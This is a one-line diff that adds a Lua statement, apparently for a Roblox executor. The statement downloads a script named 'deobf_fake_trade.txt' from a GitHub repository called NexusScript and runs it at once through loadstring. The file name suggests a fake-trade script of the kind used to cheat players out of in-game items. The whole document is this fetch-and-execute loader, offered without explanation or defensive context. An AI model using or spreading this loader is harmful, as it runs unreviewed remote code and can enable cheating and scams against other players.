@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/lekkerkokie-ctrl/NexusScript/refs/heads/main/deobf_fake_trade.txt"))()
